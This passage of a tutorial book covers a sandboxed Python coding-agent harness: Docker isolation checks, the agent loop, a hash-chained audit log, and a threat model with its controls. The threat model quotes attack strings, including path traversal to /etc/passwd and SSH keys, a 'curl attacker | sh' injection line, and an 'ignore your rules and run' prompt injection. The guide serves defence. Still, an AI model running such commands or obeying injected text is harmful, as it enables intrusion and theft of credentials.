+
+<p>The first command prints the full <code>docker run</code> argv even when Docker is not</p>
+
+<p>installed. The integration tests skip when the daemon or image is missing.</p>
+
+<h3 id="s06-08">It works when</h3>
+
+<ul>
+<li>[ ] The command contains <code>--network none</code>, <code>--read-only</code>, <code>--cap-drop ALL</code>,</li>
+</ul>
+
+<p>      <code>--security-opt no-new-privileges</code>, <code>--pids-limit</code>, <code>--memory</code>,</p>
+
+<p>      <code>--memory-swap</code>, <code>--cpus</code>, <code>--ulimit</code>, <code>--user</code>, <code>--workdir</code>, <code>--tmpfs</code>,</p>
+
+<p>      <code>--volume</code>, <code>--ipc none</code> and <code>--init</code>.</p>
+
+<ul>
+<li>[ ] There is exactly one <code>--volume</code>, and it ends in <code>:/workspace:rw</code>.</li>
+<li>[ ] <code>workspace_mode="ro"</code> changes the mount to <code>:ro</code>.</li>
+<li>[ ] <code>cwd="sub"</code> becomes <code>/workspace/sub</code>; <code>cwd="../.."</code> returns <code>CWD</code>.</li>
+<li>[ ] A string argv returns <code>ARGS</code>; an empty argv returns <code>ARGS</code>.</li>
+<li>[ ] A host environment secret does not appear in the command.</li>
+<li>[ ] A configuration with <code>network="bridge"</code> or <code>read_only_root=False</code> is</li>
+</ul>
+
+<p>      refused.</p>
+
+<ul>
+<li>[ ] With Docker and the image present: Python runs, the network fails, the</li>
+</ul>
+
+<p>      root filesystem refuses a write, and the workspace is visible.</p>
+
+<h3 id="s06-09">Stage limits</h3>
+
+<ul>
+<li>A container shares the host kernel. Kernel exploits and Docker daemon</li>
+</ul>
+
+<p>  compromise are outside this boundary.</p>
+
+<ul>
+<li>The Docker socket is extremely powerful. Never mount it into the sandbox.</li>
+<li>The image is part of the attack surface. Pin the base by digest, rebuild on</li>
+</ul>
+
+<p>  security updates, and review packages.</p>
+
+<ul>
+<li>On Windows/macOS, Docker Desktop runs Linux containers in a VM. The boundary</li>
+</ul>
+
+<p>  is real, but the host file sharing layer and the VM configuration still</p>
+
+<p>  matter.</p>
+
+<ul>
+<li>Bind-mount permissions depend on the host user and Docker's user mapping.</li>
+</ul>
+
+<p>  <code>--user 1000:1000</code> may not be able to write on a host where the workspace is</p>
+
+<p>  owned by a different uid. This is a deployment decision, not a bug.</p>
+
+<ul>
+<li><code>--network none</code> blocks network access inside the container; it does not stop</li>
+</ul>
+
+<p>  the Docker daemon, the host, or a sibling container.</p>
+
+<h3 id="s06-10">If it goes wrong</h3>
+
+<ul>
+<li><strong><code>docker: command not found</code></strong> — install Docker Desktop/Engine and start it.</li>
+</ul>
+
+<p>  The unit tests still run; only the integration tests skip.</p>
+
+<ul>
+<li><strong><code>Cannot connect to the Docker daemon</code></strong> — start Docker Desktop or the</li>
+</ul>
+
+<p>  <code>docker</code> service. <code>check_available()</code> uses <code>docker version</code> for this reason.</p>
+
+<ul>
+<li><strong><code>image not found</code> / integration skip</strong> — build the image from <code>ch04/</code>:</li>
+</ul>
+
+<p>  <code>docker build -t mini-harness-python:latest docker</code>.</p>
+
+<ul>
+<li><strong>A file written in <code>/workspace</code> is owned by root</strong> — check the host mount</li>
+</ul>
+
+<p>  and the <code>--user</code> mapping. On Linux, use a uid:gid that matches the workspace</p>
+
+<p>  owner, or <code>chown</code> the workspace before the run.</p>
+
+<ul>
+<li><strong>The container is still present after a timeout</strong> — check that the unique</li>
+</ul>
+
+<p>  <code>--name</code> was passed and that <code>docker rm -f</code> has permission to talk to the</p>
+
+<p>  daemon.</p>
+
+<ul>
+<li><strong>A command that needs a writable cache fails</strong> — do not make the root</li>
+</ul>
+
+<p>  writable. Add a small, explicit tmpfs at the path the tool needs, or set</p>
+
+<p>  <code>HOME</code>/<code>TMP</code> to <code>/tmp</code>.</p>
+
+<h3 id="s06-11">Read next</h3>
+
+<ul>
+<li><code>../plan.md</code> Stage 4</li>
+<li><code>../OPERATIONS.md</code> — image updates, daemon security and incident response</li>
+<li><code>../ch05/CHAPTER.md</code> — wiring Docker into the final harness</li>
+</ul>
+
+</section>
+
+<hr>
+
+<section id="s07">
+<h2><span class="num">07</span><span>Chapter 5 — Stage 5: The finished harness</span></h2>
+
+<p><strong>Book:</strong> Stage 5, "The finished harness"</p>
+
+<p><strong>Plan:</strong> Stage 5</p>
+
+<p><strong>Goal:</strong> Wire the path policy, file sandbox, Docker runner and an append-only audit log into one small agent loop, then prove it end to end without an API key.</p>
+
+<h3 id="s07-01">The problem</h3>
+
+<p>At the end of Stage 4 we have two good boundaries and no product:</p>
+
+<ul>
+<li>file tools that enforce a path policy;</li>
+<li>a Docker runner that enforces a container contract.</li>
+</ul>
+
+<p>What is missing is the thing that makes them an <strong>agent</strong>: a loop that chooses a</p>
+
+<p>tool, sees the observation, and decides what to do next — plus a record of what</p>
+
+<p>happened that an operator can inspect afterwards.</p>
+
+<p>Stage 5 adds exactly three pieces:</p>
+
+<ol>
+<li>a <code>Toolbox</code> that routes file and command tools through one interface;</li>
+<li>an <code>Agent</code> loop with a hard step limit and an audit record for every action;</li>
+<li>a <code>ScriptedModel</code> and CLI so the whole thing runs offline and in CI.</li>
+</ol>
+
+<p>The absence of an LLM client is deliberate. The book is about the sandbox, not</p>
+
+<p>about choosing a provider. A real adapter implements one method and everything</p>
+
+<p>else stays the same.</p>
+
+<h3 id="s07-02">What changed</h3>
+
+<ul>
+<li>Added <code>mini_harness/toolbox.py</code> — one dispatch point for all tools.</li>
+<li>Added <code>mini_harness/docker_tools.py</code> — the model-facing command tool.</li>
+<li>Added <code>mini_harness/audit.py</code> — append-only, hash-chained JSONL.</li>
+<li>Added <code>mini_harness/agent.py</code> — the ReAct loop and <code>ScriptedModel</code>.</li>
+<li>Added <code>mini_harness/cli.py</code> and <code>__main__.py</code> — the offline demo.</li>
+<li>Added <code>tests/test_toolbox.py</code>, <code>test_agent.py</code>, <code>test_audit.py</code> and</li>
+</ul>
+
+<p>  <code>test_cli.py</code>.</p>
+
+<h3 id="s07-03">The toolbox</h3>
+
+<p>The toolbox is intentionally thin:</p>
+
+<figure class="code"><pre>if name == "run_command":
+    return run_command_tool(self.runner, arguments)
+if name in FILE_TOOL_NAMES:
+    return file_tools.run_tool(self.sandbox, name, arguments)
+return f"ERROR[UNKNOWN_TOOL]: no tool named {name!r}"</pre></figure>
+
+<p>It adds no second policy. Each boundary owns its own decisions:</p>
+
+<ul>
+<li>the sandbox owns file paths, sizes and atomic writes;</li>
+<li>the Docker runner owns the container recipe;</li>
+<li>the toolbox only routes by name.</li>
+</ul>
+
+<p>A new file tool appears in <code>FILE_TOOL_NAMES</code> automatically because the set is</p>
+
+<p>derived from <code>file_tools.TOOL_SPECS</code>. A new command tool would add one branch</p>
+
+<p>and one spec.</p>
+
+<h3 id="s07-04">The loop</h3>
+
+<figure class="code"><pre>messages = [user task]
+for step in 1..max_steps:
+    reply = model(messages, tools)
+    if reply is final: return
+    observation = toolbox.run(reply.tool, reply.args)
+    messages += [tool_call, observation]
+return "stopped after max_steps"</pre></figure>
+
+<p>Two details matter:</p>
+
+<ul>
+<li><strong>The step limit is in the loop, not the model.</strong> A model can loop forever;</li>
+</ul>
+
+<p>  the harness cannot.</p>
+
+<ul>
+<li><strong>A refusal is an observation, not an exception.</strong> The model sees</li>
+</ul>
+
+<p>  <code>ERROR[PATH]</code> or <code>ERROR[DOCKER_MISSING]</code> and can choose a different action.</p>
+
+<p>  The loop continues.</p>
+
+<p><code>AgentResult</code> returns the final text, the step count, the stop reason, the full</p>
+
+<p>transcript and a compact list of observations. A UI can render the transcript;</p>
+
+<p>a test can assert on the observations.</p>
+
+<h3 id="s07-05">The audit log</h3>
+
+<p><code>AuditLog</code> writes one JSON object per line:</p>
+
+<figure class="code"><pre>{"ts":"...","seq":1,"action":"tool.call","outcome":"requested",
+ "detail":{"tool":"read_file","args":{"path":"hello.py"}},
+ "prev":"0000...","hash":"..."}</pre></figure>
+
+<p>Properties:</p>
+
+<ul>
+<li><strong>Append-only.</strong> Opened with append mode and fsynced after each line.</li>
+<li><strong>Hash-chained.</strong> <code>hash = sha256(prev + canonical_event)</code>. Editing or deleting</li>
+</ul>
+
+<p>  a middle line breaks <code>verify()</code>.</p>
+
+<ul>
+<li><strong>Outside the workspace.</strong> The file tools cannot edit their own trail through</li>
+</ul>
+
+<p>  the sandbox. A local user with the same permissions still can; the chain makes</p>
+
+<p>  tampering visible, not impossible.</p>
+
+<ul>
+<li><strong>Redacted.</strong> Keys matching <code>key|token|secret|password|credential</code> are written</li>
+</ul>
+
+<p>  as <code><strong><em>REDACTED</strong></em></code>; long values are truncated.</p>
+
+<p>The audit records <code>agent.start</code>, <code>tool.call</code>, <code>tool.result</code>, <code>agent.final</code> and</p>
+
+<p><code>agent.max_steps</code>. The <code>tool.result</code> observation is clipped in the log but kept</p>
+
+<p>in full in the transcript.</p>
+
+<h3 id="s07-06">The scripted demo</h3>
+
+<p>From <code>ch05/</code>:</p>
+
+<figure class="code"><pre>python -m mini_harness
+python -m mini_harness --build
+python -m pytest -v</pre></figure>
+
+<p>The demo:</p>
+
+<ol>
+<li>writes <code>hello.py</code> through the file sandbox;</li>
+<li>reads it back with numbered lines;</li>
+<li>runs <code>python hello.py</code> in the container;</li>
+<li>returns a final answer;</li>
+<li>prints the audit verification result.</li>
+</ol>
+
+<p>If Docker is missing, step 3 returns:</p>
+
+<figure class="code"><pre>ERROR[DOCKER_MISSING]: Docker CLI/daemon is not available</pre></figure>
+
+<p>The loop still finishes. That is the desired behaviour: infrastructure absence</p>
+
+<p>is a visible failed tool call, not a crash.</p>
+
+<h3 id="s07-07">End-to-end acceptance</h3>
+
+<p>Run these in order on a machine with Docker and the image built:</p>
+
+<figure class="code"><pre>cd ch04 &amp;&amp; python -m mini_harness.demo --build
+cd ../ch05 &amp;&amp; python -m mini_harness --build
+python -m pytest -v</pre></figure>
+
+<ul>
+<li>[ ] <code>python -m mini_harness</code> exits 0 and prints <code>audit chain verifies: True</code>.</li>
+<li>[ ] <code>hello.py</code> is written and read back correctly.</li>
+<li>[ ] The <code>run_command</code> observation is <code>OK</code> with the container output.</li>
+<li>[ ] Stopping the Docker daemon produces <code>ERROR[DOCKER_MISSING]</code>, not a crash.</li>
+<li>[ ] Killing the daemon or making the image missing still leaves a verifiable</li>
+</ul>
+
+<p>      audit log.</p>
+
+<ul>
+<li>[ ] The CLI's temporary workspace is cleaned up when the process exits.</li>
+<li>[ ] All chapter test suites pass; Docker integration tests skip cleanly on a</li>
+</ul>
+
+<p>      machine without a daemon or image.</p>
+
+<h3 id="s07-08">Stage limits</h3>
+
+<p>This is a teaching harness, not a production service. It still lacks:</p>
+
+<ul>
+<li>a real LLM adapter, retries, token accounting and streaming;</li>
+<li>per-user policy, approval prompts and capability tokens;</li>
+<li>concurrency and a queue;</li>
+<li>log shipping, rotation and retention;</li>
+<li>a hardened host, a rootless Docker setup and network policy outside the</li>
+</ul>
+
+<p>  container;</p>
+
+<ul>
+<li>an image update pipeline and vulnerability scanning.</li>
+</ul>
+
+<p>Those are operations concerns. <code>../OPERATIONS.md</code> explains where they attach to</p>
+
+<p>this code without changing the boundaries.</p>
+
+<h3 id="s07-09">If it goes wrong</h3>
+
+<ul>
+<li><strong><code>ModuleNotFoundError: mini_harness</code></strong> — run from the chapter directory:</li>
+</ul>
+
+<p>  <code>cd ch05 &amp;&amp; python -m mini_harness</code>. The package lives beside the chapter, not</p>
+
+<p>  in a global environment.</p>
+
+<ul>
+<li><strong><code>audit chain verifies: False</code></strong> — do not keep appending. Inspect</li>
+</ul>
+
+<p>  <code>audit/events.jsonl</code>; a malformed or edited line breaks the chain. Restore a</p>
+
+<p>  known-good copy and investigate.</p>
+
+<ul>
+<li><strong>The audit file already exists and fails verification</strong> — <code>AuditLog</code> refuses</li>
+</ul>
+
+<p>  to open a broken log. Move it aside deliberately; do not edit it to make the</p>
+
+<p>  check pass.</p>
+
+<ul>
+<li><strong>The model gets stuck</strong> — lower <code>--max-steps</code> and inspect the transcript. A</li>
+</ul>
+
+<p>  tool returning <code>ERROR[...]</code> repeatedly is a prompt or tool-contract problem,</p>
+
+<p>  not a sandbox problem.</p>
+
+<ul>
+<li><strong>The container command reports <code>ERROR[EXIT]</code> with a permission error</strong> —</li>
+</ul>
+
+<p>  check the workspace mount and <code>--user</code> mapping. The file tools may have</p>
+
+<p>  written a file owned by the host user that the container uid cannot edit.</p>
+
+<ul>
+<li><strong>Audit logging slows the demo</strong> — fsync on every event is deliberate. Batch</li>
+</ul>
+
+<p>  or buffer only with a clear durability trade-off; do not silently drop the</p>
+
+<p>  trail.</p>
+
+<h3 id="s07-10">Read next</h3>
+
+<ul>
+<li><code>../plan.md</code> Stage 5</li>
+<li><code>../OPERATIONS.md</code> — the runbook</li>
+<li><code>../THREAT_MODEL.md</code> — what remains after the container</li>
+<li><code>../qa.html</code> — the architecture Q&amp;A companion</li>
+</ul>
+
+</section>
+
+<hr>
+
+<section id="s08">
+<h2><span class="num">08</span><span>Threat model</span></h2>
+
+<p>This document describes what the mini Python coding harness is trying to</p>
+
+<p>protect, who might attack it, and which control is supposed to stop each attack.</p>
+
+<p>It is deliberately smaller than a platform threat model. Read it with the</p>
+
+<p>chapters; a control without a test is a wish, and a test without a stated asset</p>
+
+<p>is noise.</p>
+
+<h3 id="s08-01">1. Assets</h3>
+
+<div class="table-wrap"><table>
+<tr><th>Asset</th><th>Why it matters</th></tr>
+<tr><td>Host files outside the workspace</td><td>SSH keys, cloud credentials, browser data, source code, personal files</td></tr>
+<tr><td>The workspace</td><td>The code and documents the user asked the agent to change</td></tr>
+<tr><td>The host process and its environment</td><td>API keys, proxy credentials, session tokens</td></tr>
+<tr><td>Host compute</td><td>CPU, memory, disk, process table, open file descriptors</td></tr>
+<tr><td>Network access</td><td>Exfiltration and payload download</td></tr>
+<tr><td>The audit trail</td><td>Reconstruction and accountability</td></tr>
+<tr><td>The sandbox image and daemon</td><td>A compromised image or daemon defeats the boundary</td></tr>
+<tr><td>The user's trust</td><td>A silent bad edit or a leaked secret is worse than a visible refusal</td></tr>
+</table></div>
+
+<h3 id="s08-02">2. Actors and assumptions</h3>
+
+<div class="table-wrap"><table>
+<tr><th>Actor</th><th>Capability</th><th>Assumption</th></tr>
+<tr><td>User</td><td>Chooses the task, workspace and policy</td><td>Trusted to configure the tool</td></tr>
+<tr><td>Model</td><td>Produces tool calls, including malicious or mistaken ones</td><td><strong>Untrusted</strong>; may be prompt-injected by files it reads</td></tr>
+<tr><td>Local user</td><td>Same OS permissions as the harness</td><td>Partially trusted; can tamper with the audit log</td></tr>
+<tr><td>Remote attacker</td><td>Controls a web page, dependency, or file the model reads</td><td><strong>Untrusted</strong></td></tr>
+<tr><td>Malicious dependency</td><td>Runs during image build or inside the container</td><td><strong>Untrusted</strong></td></tr>
+<tr><td>Docker daemon</td><td>Can create containers with broad host access</td><td>Trusted infrastructure; must be protected</td></tr>
+</table></div>
+
+<p>The model is not a security principal. It can be convinced by a README, an</p>
+
+<p>issue comment, or a test fixture to ask for the wrong thing. The harness must</p>
+
+<p>make the wrong thing fail safely.</p>
+
+<h3 id="s08-03">3. Trust boundaries</h3>
+
+<figure class="code"><pre>user / model text
+      |
+      v
+  tool layer  ---------------&gt; observation text (untrusted but harmless)
+      |
+      +--&gt; PathPolicy + Sandbox -----&gt; workspace files
+      |
+      +--&gt; DockerRunner -------------&gt; container process
+                                         |
+                                         +--&gt; bind-mounted workspace</pre></figure>
+
+<p>Boundaries:</p>
+
+<ol>
+<li><strong>Model text to tool arguments.</strong> Validate shape, types, lengths and names.</li>
+<li><strong>Tool arguments to filesystem paths.</strong> Resolve and contain real paths.</li>
+<li><strong>Tool arguments to process argv.</strong> No shell, allowlist the program.</li>
+<li><strong>Process to host.</strong> Container namespaces, cgroups, capabilities, seccomp.</li>
+<li><strong>Harness to audit.</strong> Append-only chain outside the writable workspace.</li>
+</ol>
+
+<h3 id="s08-04">4. Threats and controls</h3>
+
+<h4 id="s08-04-01">T1 — Path traversal</h4>
+
+<p><strong>Attack:</strong> <code>../../etc/passwd</code>, <code>..\..\Users\me\.ssh\id_rsa</code>, encoded or</p>
+
+<p>repeated separators.</p>
+
+<p><strong>Control:</strong> <code>PathPolicy</code> normalises separators, collapses <code>.</code> and <code>..</code>, and</p>
+
+<p>checks containment against canonical paths. Tests: ch01 traversal cases.</p>
+
+<p><strong>Residual:</strong> A same-user process can bypass Python entirely. The container is</p>
+
+<p>the answer for command execution.</p>
+
+<h4 id="s08-04-02">T2 — Prefix-sibling escape</h4>
+
+<p><strong>Attack:</strong> workspace <code>/tmp/ws</code>, target <code>/tmp/ws-evil/secret</code>.</p>
+
+<p><strong>Control:</strong> <code>os.path.commonpath</code> on canonical paths, not <code>startswith</code>. Tests:</p>
+
+<p>ch00 asserts the bug; ch01 asserts the refusal.</p>
+
+<h4 id="s08-04-03">T3 — Symlink escape</h4>
+
+<p><strong>Attack:</strong> plant <code>workspace/link -&gt; /home/me/.ssh</code>, then read or write through</p>
+
+<p>it.</p>
+
+<p><strong>Control:</strong> resolve the deepest existing ancestor with <code>realpath</code>, then</p>
+
+<p>reattach the missing tail; re-check containment; refuse writes through a final</p>
+
+<p>symlink. Tests: ch01 and ch02, skipped when the OS cannot create links.</p>
+
+<p><strong>Residual:</strong> A time-of-check/time-of-use race between <code>realpath</code> and <code>open</code>.</p>
+
+<p>The sandbox is policy, not a kernel boundary.</p>
+
+<h4 id="s08-04-04">T4 — Windows-specific path confusion</h4>
+
+<p><strong>Attack:</strong> <code>C:foo</code> drive-relative paths, UNC paths, <code>CON</code>/<code>NUL</code> device names,</p>
+
+<p>trailing dots or spaces, NTFS alternate data streams.</p>
+
+<p><strong>Control:</strong> reject drive-relative and UNC forms; reject reserved names;</p>
+
+<p>reject colon-bearing/alternate-data-stream names; reject control characters;</p>
+
+<p>normalise separators; compare case-insensitively on Windows. Tests: ch01.</p>
+
+<p><strong>Residual:</strong> The policy does not parse every Windows path form; unusual device</p>
+
+<p>paths or filesystem features should be handled by the host policy and the</p>
+
+<p>container boundary.</p>
+
+<h4 id="s08-04-05">T5 — Shell injection</h4>
+
+<p><strong>Attack:</strong> <code>python -c "..." ; curl attacker | sh</code>, <code>&amp;&amp;</code>, pipes, command</p>
+
+<p>substitution.</p>
+
+<p><strong>Control:</strong> argv lists only; no <code>shell=True</code> for model input. A semicolon is an</p>
+
+<p>argument. Tests: ch03 shell-semantics case.</p>
+
+<p><strong>Residual:</strong> An allowlisted program can still spawn helpers. The container</p>
+
+<p>limits what those helpers can reach.</p>
+
+<h4 id="s08-04-06">T6 — Environment leakage</h4>
+
+<p><strong>Attack:</strong> read <code>OPENROUTER_API_KEY</code>, proxy credentials or cloud tokens from</p>
+
+<p>the inherited environment.</p>
+
+<p><strong>Control:</strong> build a minimal environment from OS-essential keys plus</p>
+
+<p>workspace-local <code>HOME</code>/<code>TMP</code>; do not pass the host environment. Tests: ch03 and</p>
+
+<p>ch04.</p>
+
+<p><strong>Residual:</strong> A secret deliberately placed in the new environment is visible to</p>
+
+<p>the child. Do not add secrets to the tool environment.</p>
+
+<h4 id="s08-04-07">T7 — Resource exhaustion</h4>
+
+<p><strong>Attack:</strong> allocate memory forever, fork bomb, fill the disk, print gigabytes,</p>
+
+<p>open thousands of files, sleep forever.</p>
+
+<p><strong>Control:</strong> byte caps and entry caps (ch02); timeout, process-tree kill, output</p>
+
+<p>caps and POSIX rlimits (ch03); container memory, swap, CPU, pids and nofile</p>
+
+<p>limits (ch04); a hard <code>max_steps</code> (ch05).</p>
+
+<p><strong>Residual:</strong> The local runner’s Windows path has no rlimits; use Docker. A</p>
+
+<p>container can still consume its limits and slow the host.</p>
+
+<h4 id="s08-04-08">T8 — Network access and exfiltration</h4>
+
+<p><strong>Attack:</strong> send workspace contents or secrets to a remote endpoint.</p>
+
+<p><strong>Control:</strong> <code>--network none</code> in the container. Tests: ch04 integration tries a</p>
+
+<p>TCP connection and expects failure.</p>
+
+<p><strong>Residual:</strong> The host-side file tools do not use the network, but the Docker</p>
+
+<p>daemon, host processes and sibling containers are outside this control.</p>
+
+<h4 id="s08-04-09">T9 — Container escape / privilege escalation</h4>
+
+<p><strong>Attack:</strong> exploit a setuid binary, a kernel bug, a mounted device, the Docker</p>
+
+<p>socket, or excessive capabilities.</p>
+
+<p><strong>Control:</strong> non-root user, <code>--cap-drop ALL</code>, <code>no-new-privileges</code>, read-only</p>
+
+<p>root, no privileged mode, no Docker socket mount, default seccomp, minimal</p>
+
+<p>image. Tests: ch04 asserts the flags and the root-write refusal.</p>
+
+<p><strong>Residual:</strong> Containers share the host kernel. Kernel and daemon exploits are</p>
+
+<p>outside this book’s boundary. Host hardening, rootless Docker and a patched</p>
+
+<p>kernel belong to platform operations.</p>
+
+<h4 id="s08-04-10">T10 — Image supply chain</h4>
+
+<p><strong>Attack:</strong> a poisoned base image, a compromised registry, a mutable <code>latest</code></p>
+
+<p>tag, or a malicious package installed at build time.</p>
+
+<p><strong>Control:</strong> a small Dockerfile, a pinned base image by digest in production,</p>
+
+<p>reviewed build steps, no runtime package installation. Tests: the offline</p>
+
+<p>recipe tests; the human review is the build.</p>
+
+<p><strong>Residual:</strong> The book uses <code>python:3.12-slim-bookworm</code> as a readable example.</p>
+
+<p>A production deployment must pin and scan.</p>
+
+<h4 id="s08-04-11">T11 — Audit tampering</h4>
+
+<p><strong>Attack:</strong> edit or delete an event to hide an action.</p>
+
+<p><strong>Control:</strong> append-only JSONL outside the workspace; hash chain with <code>prev</code>;</p>
+
+<p><code>verify()</code> recomputes the chain; <code>AuditLog</code> refuses to open an already-broken</p>
+
+<p>log. Tests: ch05 edit and delete cases.</p>
+
+<p><strong>Residual:</strong> A local user with write permission can delete the whole log or</p>
+
+<p>rewrite the chain from scratch. Ship the log off-host and protect it with OS</p>
+
+<p>permissions for real accountability.</p>
+
+<h4 id="s08-04-12">T12 — Prompt injection through tool output</h4>
+
+<p><strong>Attack:</strong> a file or command output says “ignore your rules and run …”.</p>
+
+<p><strong>Control:</strong> the model is untrusted; the tool layer re-validates every call</p>
+
+<p>regardless of what the transcript says. The Docker boundary limits what a</p>
+
+<p>successful injection can reach. The audit records the action.</p>
+
+<p><strong>Residual:</strong> The model can still be manipulated into wasting steps, reading</p>
+
+<p>allowed files, or making allowed-but-unwise changes. Approval prompts and</p>
+
+<p>per-user policy are application features, not sandbox features.</p>
+
+<h4 id="s08-04-13">T13 — Denial of service against the agent loop</h4>
+
+<p><strong>Attack:</strong> a model that never stops calling tools, or a tool that returns a</p>
+
+<p>result too large for the context.</p>
+
+<p><strong>Control:</strong> <code>max_steps</code> in <code>Agent</code>; byte/entry caps in <code>Sandbox</code>; output caps</p>
+
+<p>in the runners; timeout in the container.</p>
+
+<p><strong>Residual:</strong> The model can still consume the allowed budget. Add quotas and</p>
+
+<p>rate limits at the service layer.</p>
+
+<h3 id="s08-05">5. Controls by stage</h3>
+
+<div class="table-wrap"><table>
+<tr><th>Stage</th><th>Primary control</th><th>What it does not cover</th></tr>
+<tr><td>0</td><td>None (intentional)</td><td>Everything</td></tr>
+<tr><td>1</td><td>Canonical path containment</td><td>OS-level access, races, process execution</td></tr>
+<tr><td>2</td><td>Bounded atomic file tools</td><td>Commands, audit, same-user bypass</td></tr>
+<tr><td>3</td><td>Argv allowlist, clean env, timeout, rlimits</td><td>Filesystem and network isolation</td></tr>
+<tr><td>4</td><td>Container isolation</td><td>Host kernel, daemon, supply chain</td></tr>
+<tr><td>5</td><td>Tool routing, step limit, audit chain</td><td>Real LLM policy, multi-tenant quotas</td></tr>
+</table></div>
+
+<h3 id="s08-06">6. Residual risk statement</h3>
+
+<p>After Stage 5, the harness is suitable for **single-user, local, teaching and</p>
+
+<p>prototyping** use. It is not suitable as a multi-tenant service without:</p>
+
+<ul>
+<li>host hardening and rootless Docker;</li>
+<li>a pinned, scanned image pipeline;</li>
+<li>per-user quotas and approval flows;</li>
+<li>log shipping and retention;</li>
+<li>a network policy outside the container;</li>
+<li>a real LLM adapter with its own secrets isolation.</li>
+</ul>
+
+<p>The strongest single sentence is: **the container is the boundary; the path</p>
+
+<p>policy is a usability and accident-prevention layer; the audit is evidence, not</p>
+
+<p>prevention.**</p>
+
+<h3 id="s08-07">7. Review checklist</h3>
+
+<p>Before changing any boundary, answer these:</p>
+
+<ul>
+<li>[ ] Which asset does this change protect?</li>
+<li>[ ] Which test proves the control still works?</li>
+<li>[ ] Does this widen the reachable filesystem, network, environment or process</li>
+</ul>
+
+<p>      set?</p>
+
+<ul>
+<li>[ ] Does a refusal still become an observation?</li>
+<li>[ ] Is the audit event still written outside the workspace?</li>
+<li>[ ] Does the change work on Windows and POSIX, or is the platform gap</li>
+</ul>
+
+<p>      documented?</p>
+
+<ul>
+<li>[ ] Is the new default the safe one?</li>
+</ul>
+
+</section>
+
+<hr>
+
+<section id="s09">
+<h2><span class="num">09</span><span>Operations runbook</span></h2>
+
+<p>This is the operator-facing companion to the chapters. It assumes you have read</p>
+
+<p><code>THREAT_MODEL.md</code> and understand that the <strong>container is the boundary</strong>; the</p>
+
+<p>Python path policy is accident prevention and usability, not a jail.</p>
+
+<h3 id="s09-01">1. Prerequisites</h3>
+
+<div class="table-wrap"><table>
+<tr><th>Component</th><th>Minimum</th><th>Notes</th></tr>
+<tr><td>Python</td><td>3.11</td><td><code>TestCase</code>-style tests; pytest collects them; <code>enterContext</code> needs 3.11</td></tr>
+<tr><td>Docker</td><td>Engine 24+ or Docker Desktop</td><td>Linux containers</td></tr>
+<tr><td>OS</td><td>Windows, macOS or Linux</td><td>Symlink and rlimit tests vary by platform</td></tr>
+<tr><td>Disk</td><td>~1 GB for the Python base image</td><td>More if you add tools</td></tr>
+</table></div>
+
+<p>No API key or network access is needed for the offline suites. Install pytest</p>
+
+<p>(<code>python -m pip install pytest</code>); it is the only test dependency.</p>
+
+<h3 id="s09-02">2. Install and verify</h3>
+
+<figure class="code"><pre># from the repository root
+for chapter in ch00 ch01 ch02 ch03 ch04 ch05; do
+  echo "== $chapter =="
+  (cd "$chapter" &amp;&amp; python -m pytest -v)
+done</pre></figure>
+
+<p>Expected: all tests pass; symlink, rlimit and Docker integration tests skip with</p>
+
+<p>a reason on platforms that cannot run them.</p>
+
+<p>Build the image:</p>
+
+<figure class="code"><pre>cd ch04
+docker build -t mini-harness-python:latest docker</pre></figure>
+
+<p>For production, build with a pinned digest and a unique tag:</p>
+
+<figure class="code"><pre>docker build \
+  --build-arg PYTHON_BASE=python:3.12-slim-bookworm@sha256:&lt;digest&gt; \
+  -t registry.example.com/mini-harness-python:2026-11-07 \
+  docker</pre></figure>
+
+<p>The book's Dockerfile uses a readable <code>FROM</code> line. A real pipeline should</p>
+
+<p>template the digest and record it in the release metadata.</p>
+
+<h3 id="s09-03">3. Configuration</h3>
+
+<p>The defaults live in <code>DockerConfig</code> (<code>ch04</code>/<code>ch05</code>) and <code>Limits</code> (<code>ch02</code>/<code>ch03</code>).</p>
+
+<p>Treat them as policy, not constants to tweak casually.</p>
+
+<div class="table-wrap"><table>
+<tr><th>Knob</th><th>Default</th><th>Raise when</th><th>Lower when</th></tr>
+<tr><td><code>timeout_seconds</code></td><td>20</td><td>legitimate builds/tests need longer</td><td>interactive tasks should fail fast</td></tr>
+<tr><td><code>memory</code></td><td><code>256m</code></td><td>the toolchain needs more</td><td>untrusted workloads</td></tr>
+<tr><td><code>cpus</code></td><td><code>1.0</code></td><td>parallel test suites</td><td>shared hosts</td></tr>
+<tr><td><code>pids_limit</code></td><td>64</td><td>test runners spawn workers</td><td>fork-bomb exposure</td></tr>
+<tr><td><code>nofile_limit</code></td><td>64</td><td>large test suites</td><td>strict workloads</td></tr>
+<tr><td><code>max_output_bytes</code></td><td>200 000</td><td>logs need more</td><td>context/memory pressure</td></tr>
+<tr><td><code>max_read_bytes</code></td><td>2 MiB</td><td>large source files</td><td>small-model context</td></tr>
+<tr><td><code>max_write_bytes</code></td><td>1 MiB</td><td>generated files</td><td>accidental overwrite risk</td></tr>
+<tr><td><code>max_dir_entries</code></td><td>500</td><td>monorepos</td><td>huge directories</td></tr>
+<tr><td><code>workspace_mode</code></td><td><code>rw</code></td><td>editing tasks</td><td>read-only analysis</td></tr>
+<tr><td><code>max_steps</code></td><td>8</td><td>complex tasks</td><td>cost/abuse control</td></tr>
+</table></div>
+
+<p>Change one knob at a time and add or update a test that states the new</p>
+
+<p>behaviour. A limit that is not tested is a comment.</p>
+
+<h3 id="s09-04">4. Docker daemon security</h3>
+
+<p>The daemon is more powerful than any container it starts. Protect it.</p>
+
+<ul>
+<li>Run Docker rootless where possible; otherwise restrict access to the</li>
+</ul>
+
+<p>  <code>docker</code> group and treat that group as root-equivalent.</p>
+
+<ul>
+<li>Never mount <code>/var/run/docker.sock</code> into the sandbox. A container with the</li>
+</ul>
+
+<p>  socket can start a privileged container and own the host.</p>
+
+<ul>
+<li>Keep the daemon bound to a local socket; do not expose TCP without TLS and</li>
+</ul>
+
+<p>  authentication.</p>
+
+<ul>
+<li>Enable user namespace remapping if your platform supports it.</li>
+<li>Apply host firewall policy outside the container. <code>--network none</code> is the</li>
+</ul>
+
+<p>  container control; it does not configure the host.</p>
+
+<ul>
+<li>Keep the kernel and Docker patched. Container escapes often start with a</li>
+</ul>
+
+<p>  kernel or runtime vulnerability.</p>
+
+<ul>
+<li>Do not add <code>--privileged</code>, <code>--device</code>, host PID/IPC namespaces, or extra</li>
+</ul>
+
+<p>  capabilities to make a tool “just work”. Add the smallest explicit exception</p>
+
+<p>  you can and document it.</p>
+
+<h3 id="s09-05">5. Image lifecycle</h3>
+
+<ol>
+<li><strong>Build</strong> in CI from a reviewed Dockerfile.</li>
+<li><strong>Pin</strong> the base image by digest; tag the result with a date and commit.</li>
